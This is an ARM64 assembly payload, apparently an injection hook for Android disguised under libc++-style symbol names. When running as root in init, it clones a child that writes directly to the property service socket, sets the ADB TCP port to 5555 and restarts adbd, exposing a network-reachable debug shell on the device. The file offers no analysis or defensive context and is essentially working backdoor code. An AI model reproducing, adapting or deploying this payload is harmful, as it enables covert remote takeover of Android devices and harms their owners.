.arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:
    dummy_ko_path:
    .skip 64, 0

mutex_file:
    .asciz "/dev/df"
sockaddr_un:
    .word 1  // AF_UNIX
    .asciz "/dev/socket/property_service"
    .skip 80, 0 // 补齐 sockaddr_un 结构体大小

// 属性服务协议包 1: PROP_MSG_SETPROP2 (1) | klen(21) | "service.adb.tcp.port" | vlen(4) | "5555"
msg1:
    .word 0x00000001
    .word 21
    .ascii "service.adb.tcp.port"
    .word 4
    .ascii "5555"

// 属性服务协议包 2: PROP_MSG_SETPROP2 (1) | klen(11) | "ctl.restart" | vlen(4) | "adbd"
msg2:
    .word 0x00000001
    .word 11
    .ascii "ctl.restart"
    .word 4
    .ascii "adbd"
    .balign 4

    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int dummy_ko_path - libcxx_data

    .align 4

libcxx_start:
    // 现场保护
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // 1. 检查 uid == 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // 2. 检查 tid == 1
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // 3. 创建互斥锁 /dev/df
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, return

    sub     sp, sp, 16
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // 4. clone 子进程
    mov     x8, SYS_clone
    add     x4, sp, 8
    mov     x3, xzr
    mov     x2, xzr
    mov     x1, xzr
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]
    add     sp, sp, 16

    cbnz    w0, return          

worker:
    // 5. socket(AF_UNIX, SOCK_STREAM, 0)
    mov     x0, #1 // AF_UNIX
    mov     x1, #1 // SOCK_STREAM
    mov     x2, xzr
    mov     x8, #SYS_socket
    svc     0
    tbnz    w0, #31, cleanup_df
    mov     x19, x0 // 保存 socket fd

    // 6. connect(fd, sockaddr_un, 110)
    mov     x0, x19
    adr     x1, sockaddr_un
    mov     x2, #110
    mov     x8, #SYS_connect
    svc     0
    tbnz    w0, #31, close_sock

    // 7. write(fd, msg1, 37)
    mov     x0, x19
    adr     x1, msg1
    mov     x2, #37
    mov     x8, #SYS_write
    svc     0

    // 8. write(fd, msg2, 27)
    mov     x0, x19
    adr     x1, msg2
    mov     x2, #27
    mov     x8, #SYS_write
    svc     0

close_sock:
    // 9. close(fd)
    mov     x0, x19
    mov     x8, #SYS_close
    svc     0

cleanup_df:
    // 强制删除 /dev/df
    mov     x0, -100
    adr     x1, mutex_file
    mov     x8, #SYS_unlinkat
    svc     0

myexit:
    mov     x0, #0
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
